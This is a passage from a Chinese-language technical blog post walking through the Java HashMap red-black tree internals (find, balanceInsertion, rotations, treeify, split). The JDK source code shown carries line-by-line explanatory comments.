<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 例如类接口关系如下：</span></span><br><span class="line"><span class="comment"> * interface A &#123;&#125;</span></span><br><span class="line"><span class="comment"> * interface B&lt;T&gt; extends A &#123;&#125;</span></span><br><span class="line"><span class="comment"> * interface C &#123;&#125;</span></span><br><span class="line"><span class="comment"> * class D implements B&lt;String&gt;, C &#123;&#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * getInterfaces()：返回直接实现的接口数组（不包含泛型参数）。</span></span><br><span class="line"><span class="comment"> * getGenericInterfaces()：返回直接实现的接口数组（包含泛型参数），其rawType属性包含getInterfaces()的中的类型，</span></span><br><span class="line"><span class="comment"> * 		它的getActualTypeArguments()获取泛型参数。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">Class&lt;?&gt;[] interfaces = D.class.getInterfaces();</span><br><span class="line">Type[] types = D.class.getGenericInterfaces();</span><br></pre></td></tr></table></figure>

<p><img src="/../img/Snipaste_2024-01-14_22-53-43.png"></p>
<h3 id="5-5-3-compareComparables-Class-kc-Object-k-Object-x"><a href="#5-5-3-compareComparables-Class-kc-Object-k-Object-x" class="headerlink" title="5.5.3 compareComparables(Class&lt;?&gt; kc, Object k, Object x)"></a>5.5.3 compareComparables(Class&lt;?&gt; kc, Object k, Object x)</h3><p>返回0的情况：</p>
<ol>
<li>x为null；</li>
<li>x的类型不是kc</li>
<li>x类型为kc，且k与x相互compareTo，即：k等于x</li>
</ol>
<p>返回非0的情况：</p>
<ol>
<li>x类型为kc，当k不等于x</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="title function_">compareComparables</span><span class="params">(Class&lt;?&gt; kc, Object k, Object x)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (x == <span class="literal">null</span> || x.getClass() != kc ? <span class="number">0</span> :</span><br><span class="line">            ((Comparable)k).compareTo(x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-5-4-find-int-h-Object-k-Class-kc"><a href="#5-5-4-find-int-h-Object-k-Class-kc" class="headerlink" title="5.5.4 find(int h, Object k, Class&lt;?&gt; kc)"></a>5.5.4 find(int h, Object k, Class&lt;?&gt; kc)</h3><p>递归遍历红黑树，找到指定hash值，key值，key类型的节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> TreeNode&lt;K,V&gt; <span class="title function_">find</span><span class="params">(<span class="type">int</span> h, Object k, Class&lt;?&gt; kc)</span> &#123;</span><br><span class="line">    <span class="comment">// 存储递归中的左、右子节点</span></span><br><span class="line">    TreeNode&lt;K,V&gt; p = <span class="built_in">this</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// ph-p的hash值；dir遍历的方向；pk-p的key</span></span><br><span class="line">        <span class="type">int</span> ph, dir; K pk;</span><br><span class="line">        TreeNode&lt;K,V&gt; pl = p.left, pr = p.right, q;</span><br><span class="line">        <span class="comment">// p的hash值 &gt; hash值，遍历左子树</span></span><br><span class="line">        <span class="keyword">if</span> ((ph = p.hash) &gt; h)</span><br><span class="line">            p = pl;</span><br><span class="line">        <span class="comment">// p的hash值 &lt; hash值，遍历右子树</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ph &lt; h)</span><br><span class="line">            p = pr;</span><br><span class="line">        <span class="comment">// hash值相等，key也相等，说明key完全相同，节点找到直接返回</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((pk = p.key) == k || (k != <span class="literal">null</span> &amp;&amp; k.equals(pk)))</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        <span class="comment">// hash值相等，key不同，左子树为null，方向往右</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pl == <span class="literal">null</span>)</span><br><span class="line">            p = pr;</span><br><span class="line">        <span class="comment">// hash值相等，key不同，右子树为null，方向往左</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pr == <span class="literal">null</span>)</span><br><span class="line">            p = pl;</span><br><span class="line">        <span class="comment">// hash值相等，key不同，左右子树都不为null，k实现了Comparable接口，但k和pk不相等</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((kc != <span class="literal">null</span> ||</span><br><span class="line">                  (kc = comparableClassFor(k)) != <span class="literal">null</span>) &amp;&amp;</span><br><span class="line">                 (dir = compareComparables(kc, k, pk)) != <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 小于0，方向往左，大于0，方向往右</span></span><br><span class="line">            p = (dir &lt; <span class="number">0</span>) ? pl : pr;</span><br><span class="line">        <span class="comment">// hash值相等，key不同，左右子树都不为null，k没有实现了Comparable接口，先递归遍历右子树</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((q = pr.find(h, k, kc)) != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> q;</span><br><span class="line">        <span class="comment">// 没找到，再切换左子树进行遍历</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p = pl;</span><br><span class="line">    &#125; <span class="keyword">while</span> (p != <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-5-5-newTreeNode-int-hash-K-key-V-value-Node-next"><a href="#5-5-5-newTreeNode-int-hash-K-key-V-value-Node-next" class="headerlink" title="5.5.5 newTreeNode(int hash, K key, V value, Node&lt;K,V&gt; next)"></a>5.5.5 newTreeNode(int hash, K key, V value, Node&lt;K,V&gt; next)</h3><p>创建并返回新的红黑树节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TreeNode&lt;K,V&gt; <span class="title function_">newTreeNode</span><span class="params">(<span class="type">int</span> hash, K key, V value, Node&lt;K,V&gt; next)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>&lt;&gt;(hash, key, value, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-5-6-balanceInsertion-TreeNode-root-TreeNode-x"><a href="#5-5-6-balanceInsertion-TreeNode-root-TreeNode-x" class="headerlink" title="5.5.6 balanceInsertion(TreeNode&lt;K,V&gt; root, TreeNode&lt;K,V&gt; x)"></a>5.5.6 balanceInsertion(TreeNode&lt;K,V&gt; root, TreeNode&lt;K,V&gt; x)</h3><p>平衡化插入的节点，共有7种情况：</p>
<ol>
<li>插入节点为根节点；</li>
<li>插入节点父节点为黑色，直接插入，改为红色即可；</li>
<li>插入节点父节点为红色，叔叔节点也是红色。父节点、叔叔节点改为黑色，爷爷节点改为红色，当前节点指向爷爷节点，一直调整到根节点，根节点最后调整为黑色；</li>
<li>插入节点父节点为红色，叔叔节点也是黑色，这种包含4中情况（LL，LR，RR，RL）。具体调整方法可查看：数据结构 - 树.md 中的红黑树插入。</li>
</ol>
<p>图1（对应第3种情况）、图2（对应第4种情况的LR）均为红黑树某些情况的调整过程，代码中有注释。</p>
<p><img src="/../img/red_black_tree_1.png"></p>
<hr>
<p><img src="/../img/red_black_tree_2.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; TreeNode&lt;K,V&gt; <span class="title function_">balanceInsertion</span><span class="params">(TreeNode&lt;K,V&gt; root,</span></span><br><span class="line"><span class="params">                                            TreeNode&lt;K,V&gt; x)</span> &#123;</span><br><span class="line">    <span class="comment">// 新节点默认红色</span></span><br><span class="line">    x.red = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// xp-x的父节点；xpp-x的爷爷；xppl-x的爷爷的左子节点；xppr-x的爷爷的右子节点</span></span><br><span class="line">    <span class="keyword">for</span> (TreeNode&lt;K,V&gt; xp, xpp, xppl, xppr;;) &#123;</span><br><span class="line">        <span class="comment">// x为根节点，设为黑色，结束方法执行</span></span><br><span class="line">        <span class="keyword">if</span> ((xp = x.parent) == <span class="literal">null</span>) &#123;</span><br><span class="line">            x.red = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// xp不为null，xp为黑色 或 xpp为null（即xp为根节点），结束方法执行</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!xp.red || (xpp = xp.parent) == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="comment">// 以下if均在此条件前提下：xp不为null，xp为红色，xpp不为null</span></span><br><span class="line">        <span class="comment">// x的父节点为爷爷节点的左子节点情况下</span></span><br><span class="line">        <span class="keyword">if</span> (xp == (xppl = xpp.left)) &#123;</span><br><span class="line">            <span class="comment">// x的爷爷节点存在右子节点，且为红色。则目前：x,xp,xppr均为红色，把xp,xppr设为黑色，xpp设为红色。（图1）</span></span><br><span class="line">            <span class="comment">// xpp指向x继续往树根循环</span></span><br><span class="line">            <span class="keyword">if</span> ((xppr = xpp.right) != <span class="literal">null</span> &amp;&amp; xppr.red) &#123;</span><br><span class="line">                xppr.red = <span class="literal">false</span>;</span><br><span class="line">                xp.red = <span class="literal">false</span>;</span><br><span class="line">                xpp.red = <span class="literal">true</span>;</span><br><span class="line">                x = xpp;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// else分支前提：x的爷爷节点不存在右子节点，或存在但为黑色。</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// x是xp的右子节点</span></span><br><span class="line">                <span class="keyword">if</span> (x == xp.right) &#123;</span><br><span class="line">                    <span class="comment">// 设定x为xp，然后进行左旋，详细：5.5.7</span></span><br><span class="line">                    root = rotateLeft(root, x = xp);</span><br><span class="line">                    <span class="comment">// 重新设定xp,xpp的值</span></span><br><span class="line">                    xpp = (xp = x.parent) == <span class="literal">null</span> ? <span class="literal">null</span> : xp.parent;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (xp != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 左旋后，把xp节点设为黑色</span></span><br><span class="line">                    xp.red = <span class="literal">false</span>;</span><br><span class="line">                    <span class="comment">// xpp不为null，设为红色</span></span><br><span class="line">                    <span class="keyword">if</span> (xpp != <span class="literal">null</span>) &#123;</span><br><span class="line">                        xpp.red = <span class="literal">true</span>;</span><br><span class="line">                        <span class="comment">// xpp进行右旋，详细：5.5.8，这里先左旋后再右旋（图2），类似平衡二叉树调整“左右失衡的情况”。</span></span><br><span class="line">                        root = rotateRight(root, xpp);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// x的父节点为爷爷节点的右子节点情况下</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (xppl != <span class="literal">null</span> &amp;&amp; xppl.red) &#123;</span><br><span class="line">                xppl.red = <span class="literal">false</span>;</span><br><span class="line">                xp.red = <span class="literal">false</span>;</span><br><span class="line">                xpp.red = <span class="literal">true</span>;</span><br><span class="line">                x = xpp;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (x == xp.left) &#123;</span><br><span class="line">                    root = rotateRight(root, x = xp);</span><br><span class="line">                    xpp = (xp = x.parent) == <span class="literal">null</span> ? <span class="literal">null</span> : xp.parent;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (xp != <span class="literal">null</span>) &#123;</span><br><span class="line">                    xp.red = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">if</span> (xpp != <span class="literal">null</span>) &#123;</span><br><span class="line">                        xpp.red = <span class="literal">true</span>;</span><br><span class="line">                        root = rotateLeft(root, xpp);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-5-7-rotateLeft-TreeNode-root-TreeNode-p"><a href="#5-5-7-rotateLeft-TreeNode-root-TreeNode-p" class="headerlink" title="5.5.7 rotateLeft(TreeNode&lt;K,V&gt; root, TreeNode&lt;K,V&gt; p)"></a>5.5.7 rotateLeft(TreeNode&lt;K,V&gt; root, TreeNode&lt;K,V&gt; p)</h3><p>节点p围绕其右子节点左旋，返回根节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; TreeNode&lt;K,V&gt; <span class="title function_">rotateLeft</span><span class="params">(TreeNode&lt;K,V&gt; root,</span></span><br><span class="line"><span class="params">                                      TreeNode&lt;K,V&gt; p)</span> &#123;</span><br><span class="line">    TreeNode&lt;K,V&gt; r, pp, rl;</span><br><span class="line">    <span class="comment">// 左旋前提：旋转节点及其右子节点不为null</span></span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">null</span> &amp;&amp; (r = p.right) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// p的右子节点的左子节点作为p的新右子节点，若该节点不为null，设定其父节点为p</span></span><br><span class="line">        <span class="keyword">if</span> ((rl = p.right = r.left) != <span class="literal">null</span>)</span><br><span class="line">            rl.parent = p;</span><br><span class="line">        <span class="comment">// p的父节点绑定为p的右子节点的新父节点，若该节点为null，说明p的右子节点旋转后为根节点，设为黑色</span></span><br><span class="line">        <span class="keyword">if</span> ((pp = r.parent = p.parent) == <span class="literal">null</span>)</span><br><span class="line">            (root = r).red = <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// p的父节点不为null，且p为其左子节点，旋转后，p的右节点作为pp的新左子节点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pp.left == p)</span><br><span class="line">            pp.left = r;</span><br><span class="line">        <span class="comment">// p的父节点不为null，且p为其右子节点，旋转后，p的右节点作为pp的新右子节点</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            pp.right = r;</span><br><span class="line">        <span class="comment">// p的右子节点的新左节点为p</span></span><br><span class="line">        r.left = p;</span><br><span class="line">        <span class="comment">// p的父节点为r</span></span><br><span class="line">        p.parent = r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回新的根节点</span></span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-5-8-rotateRight-TreeNode-root-TreeNode-p"><a href="#5-5-8-rotateRight-TreeNode-root-TreeNode-p" class="headerlink" title="5.5.8 rotateRight(TreeNode&lt;K,V&gt; root, TreeNode&lt;K,V&gt; p)"></a>5.5.8 rotateRight(TreeNode&lt;K,V&gt; root, TreeNode&lt;K,V&gt; p)</h3><p>节点p围绕其左子节点右旋，返回根节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; TreeNode&lt;K,V&gt; <span class="title function_">rotateRight</span><span class="params">(TreeNode&lt;K,V&gt; root,</span></span><br><span class="line"><span class="params">                                       TreeNode&lt;K,V&gt; p)</span> &#123;</span><br><span class="line">    TreeNode&lt;K,V&gt; l, pp, lr;</span><br><span class="line">    <span class="comment">// 右旋前提：旋转节点及其左子节点不为null，其它与左旋刚好相反，不再赘述。</span></span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">null</span> &amp;&amp; (l = p.left) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((lr = p.left = l.right) != <span class="literal">null</span>)</span><br><span class="line">            lr.parent = p;</span><br><span class="line">        <span class="keyword">if</span> ((pp = l.parent = p.parent) == <span class="literal">null</span>)</span><br><span class="line">            (root = l).red = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pp.right == p)</span><br><span class="line">            pp.right = l;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            pp.left = l;</span><br><span class="line">        l.right = p;</span><br><span class="line">        p.parent = l;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-5-9-moveRootToFront-Node-tab-TreeNode-root"><a href="#5-5-9-moveRootToFront-Node-tab-TreeNode-root" class="headerlink" title="5.5.9 moveRootToFront(Node&lt;K,V&gt;[] tab, TreeNode&lt;K,V&gt; root)"></a>5.5.9 moveRootToFront(Node&lt;K,V&gt;[] tab, TreeNode&lt;K,V&gt; root)</h3><p>重新调整root节点为数组元素节点的头节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; <span class="keyword">void</span> <span class="title function_">moveRootToFront</span><span class="params">(Node&lt;K,V&gt;[] tab, TreeNode&lt;K,V&gt; root)</span> &#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">if</span> (root != <span class="literal">null</span> &amp;&amp; tab != <span class="literal">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (n - <span class="number">1</span>) &amp; root.hash;</span><br><span class="line">        TreeNode&lt;K,V&gt; first = (TreeNode&lt;K,V&gt;)tab[index];</span><br><span class="line">        <span class="comment">// 数组中的元素头节点和root节点不相同</span></span><br><span class="line">        <span class="keyword">if</span> (root != first) &#123;</span><br><span class="line">            Node&lt;K,V&gt; rn;</span><br><span class="line">            <span class="comment">// 重设root为数组的元素</span></span><br><span class="line">            tab[index] = root;</span><br><span class="line">            TreeNode&lt;K,V&gt; rp = root.prev;</span><br><span class="line">            <span class="keyword">if</span> ((rn = root.next) != <span class="literal">null</span>)</span><br><span class="line">                <span class="comment">// root上一个节点设为root下一个节点的上节点</span></span><br><span class="line">                ((TreeNode&lt;K,V&gt;)rn).prev = rp;</span><br><span class="line">            <span class="keyword">if</span> (rp != <span class="literal">null</span>)</span><br><span class="line">                <span class="comment">// root下一个节点设为root上一个节点的下节点</span></span><br><span class="line">                rp.next = rn;</span><br><span class="line">            <span class="keyword">if</span> (first != <span class="literal">null</span>)</span><br><span class="line">                <span class="comment">// root设为新的头节点</span></span><br><span class="line">                first.prev = root;</span><br><span class="line">            <span class="comment">// root新的next节点设为旧的头节点</span></span><br><span class="line">            root.next = first;</span><br><span class="line">            <span class="comment">// root上一个节点设为null</span></span><br><span class="line">            root.prev = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 递归检查是否合法（略）</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="title function_">checkInvariants</span><span class="params">(root)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-6-后续分析2"><a href="#5-6-后续分析2" class="headerlink" title="5.6 后续分析2"></a>5.6 后续分析2</h2><p>接着分析5.2中的代码：treeifyBin(tab, hash); 树化（把链表转为红黑树）或者容量小于64则扩容。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">treeifyBin</span><span class="params">(Node&lt;K,V&gt;[] tab, <span class="type">int</span> hash)</span> &#123;</span><br><span class="line">    <span class="type">int</span> n, index; Node&lt;K,V&gt; e;</span><br><span class="line">    <span class="comment">// 容量小于64，则扩容</span></span><br><span class="line">    <span class="keyword">if</span> (tab == <span class="literal">null</span> || (n = tab.length) &lt; MIN_TREEIFY_CAPACITY)</span><br><span class="line">        resize();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((e = tab[index = (n - <span class="number">1</span>) &amp; hash]) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// hd-头节点；tl-尾节点</span></span><br><span class="line">        TreeNode&lt;K,V&gt; hd = <span class="literal">null</span>, tl = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// 替换成红黑树节点，详细：5.6.1</span></span><br><span class="line">            TreeNode&lt;K,V&gt; p = replacementTreeNode(e, <span class="literal">null</span>);</span><br><span class="line">            <span class="comment">// 尾节点为null，说明还没构建节点，保存头节点</span></span><br><span class="line">            <span class="keyword">if</span> (tl == <span class="literal">null</span>)</span><br><span class="line">                hd = p;</span><br><span class="line">            <span class="comment">// 后续循环记录：新节点的上一个节点设为尾节点（每次循环会更新尾节点），尾节点的下一个节点为新节点</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// prev属性主要为树化而准备的</span></span><br><span class="line">                p.prev = tl;</span><br><span class="line">                tl.next = p;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 更新尾节点</span></span><br><span class="line">            tl = p;</span><br><span class="line">        &#125; <span class="keyword">while</span> ((e = e.next) != <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 树化过程，详细：5.6.2</span></span><br><span class="line">        <span class="keyword">if</span> ((tab[index] = hd) != <span class="literal">null</span>)</span><br><span class="line">            hd.treeify(tab);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-6-1-replacementTreeNode-Node-p-Node-next"><a href="#5-6-1-replacementTreeNode-Node-p-Node-next" class="headerlink" title="5.6.1 replacementTreeNode(Node&lt;K,V&gt; p, Node&lt;K,V&gt; next)"></a>5.6.1 replacementTreeNode(Node&lt;K,V&gt; p, Node&lt;K,V&gt; next)</h3><p>替换成红黑树节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TreeNode&lt;K,V&gt; <span class="title function_">replacementTreeNode</span><span class="params">(Node&lt;K,V&gt; p, Node&lt;K,V&gt; next)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>&lt;&gt;(p.hash, p.key, p.value, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-6-2-treeify-Node-tab"><a href="#5-6-2-treeify-Node-tab" class="headerlink" title="5.6.2 treeify(Node&lt;K,V&gt;[] tab)"></a>5.6.2 treeify(Node&lt;K,V&gt;[] tab)</h3><p>树化（单链表转红黑树）。与5.5大部分分析类似。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">treeify</span><span class="params">(Node&lt;K,V&gt;[] tab)</span> &#123;</span><br><span class="line">    TreeNode&lt;K,V&gt; root = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 以单链表方式遍历所有红黑树的节点（尚未树化）</span></span><br><span class="line">    <span class="keyword">for</span> (TreeNode&lt;K,V&gt; x = <span class="built_in">this</span>, next; x != <span class="literal">null</span>; x = next) &#123;</span><br><span class="line">        next = (TreeNode&lt;K,V&gt;)x.next;</span><br><span class="line">        x.left = x.right = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 根节点为null，设x为跟，颜色为黑色</span></span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            x.parent = <span class="literal">null</span>;</span><br><span class="line">            x.red = <span class="literal">false</span>;</span><br><span class="line">            root = x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">K</span> <span class="variable">k</span> <span class="operator">=</span> x.key;</span><br><span class="line">            <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> x.hash;</span><br><span class="line">            Class&lt;?&gt; kc = <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// 以根节点方式遍历组装红黑树，dir代表方向：小于等于0，添加到左子树，反之添加到右子树</span></span><br><span class="line">            <span class="keyword">for</span> (TreeNode&lt;K,V&gt; p = root;;) &#123;</span><br><span class="line">                <span class="type">int</span> dir, ph;</span><br><span class="line">                <span class="type">K</span> <span class="variable">pk</span> <span class="operator">=</span> p.key;</span><br><span class="line">                <span class="keyword">if</span> ((ph = p.hash) &gt; h)</span><br><span class="line">                    dir = -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (ph &lt; h)</span><br><span class="line">                    dir = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ((kc == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                          (kc = comparableClassFor(k)) == <span class="literal">null</span>) ||</span><br><span class="line">                         (dir = compareComparables(kc, k, pk)) == <span class="number">0</span>)</span><br><span class="line">                    dir = tieBreakOrder(k, pk);</span><br><span class="line"></span><br><span class="line">                TreeNode&lt;K,V&gt; xp = p;</span><br><span class="line">                <span class="keyword">if</span> ((p = (dir &lt;= <span class="number">0</span>) ? p.left : p.right) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    x.parent = xp;</span><br><span class="line">                    <span class="keyword">if</span> (dir &lt;= <span class="number">0</span>)</span><br><span class="line">                        xp.left = x;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        xp.right = x;</span><br><span class="line">                    root = balanceInsertion(root, x);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    moveRootToFront(tab, root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-7-后续分析3"><a href="#5-7-后续分析3" class="headerlink" title="5.7 后续分析3"></a>5.7 后续分析3</h2><p>接着分析5.3中的代码：((TreeNode&lt;K,V&gt;)e).split(this, newTab, j, oldCap); 扩容时，旧容器中有红黑树的节点数据，调用此方法进行拆分为低位、高位的链表或红黑树，重新添加到新容器中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">split</span><span class="params">(HashMap&lt;K,V&gt; map, Node&lt;K,V&gt;[] tab, <span class="type">int</span> index, <span class="type">int</span> bit)</span> &#123;</span><br><span class="line">    TreeNode&lt;K,V&gt; b = <span class="built_in">this</span>;</span><br><span class="line">    <span class="comment">// Relink into lo and hi lists, preserving order</span></span><br><span class="line">    <span class="comment">// 低位头节点、低位尾节点，低位：扩容前后数组下标不变</span></span><br><span class="line">    TreeNode&lt;K,V&gt; loHead = <span class="literal">null</span>, loTail = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 高位头节点、高位尾节点，高位：扩容后数组下标 = 扩容前下标 + 旧容器大小</span></span><br><span class="line">    TreeNode&lt;K,V&gt; hiHead = <span class="literal">null</span>, hiTail = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 低位、高位节点个数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">lc</span> <span class="operator">=</span> <span class="number">0</span>, hc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (TreeNode&lt;K,V&gt; e = b, next; e != <span class="literal">null</span>; e = next) &#123;</span><br><span class="line">        next = (TreeNode&lt;K,V&gt;)e.next;</span><br><span class="line">        e.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash &amp; bit) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((e.prev = loTail) == <span class="literal">null</span>)</span><br><span class="line">                loHead = e;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                loTail.next = e;</span><br><span class="line">            loTail = e;</span><br><span class="line">            ++lc;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((e.prev = hiTail) == <span class="literal">null</span>)</span><br><span class="line">                hiHead = e;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                hiTail.next = e;</span><br><span class="line">            hiTail = e;</span><br><span class="line">            ++hc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 低位头节点不为null</span></span><br><span class="line">    <span class="keyword">if</span> (loHead != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (lc &lt;= UNTREEIFY_THRESHOLD)</span><br><span class="line">            <span class="comment">// 个数 &lt;= 6，反树化，详细：5.7.1，低位：扩容前后数组下标不变</span></span><br><span class="line">            tab[index] = loHead.untreeify(map);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            tab[index] = loHead;</span><br><span class="line">            <span class="keyword">if</span> (hiHead != <span class="literal">null</span>) <span class="comment">// (else is already treeified)</span></span><br><span class="line">                <span class="comment">// 个数 &gt; 6，维持树化的状态，详细：5.6.2</span></span><br><span class="line">                loHead.treeify(tab);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 高位头节点不为null</span></span><br><span class="line">    <span class="keyword">if</span> (hiHead != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hc &lt;= UNTREEIFY_THRESHOLD)</span><br><span class="line">            <span class="comment">// 高位：扩容后数组下标 = 扩容前下标 + 旧容器大小</span></span><br><span class="line">            tab[index + bit] = hiHead.untreeify(map);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            tab[index + bit] = hiHead;</span><br><span class="line">            <span class="keyword">if</span> (loHead != <span class="literal">null</span>)</span><br><span class="line">                hiHead.treeify(tab);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

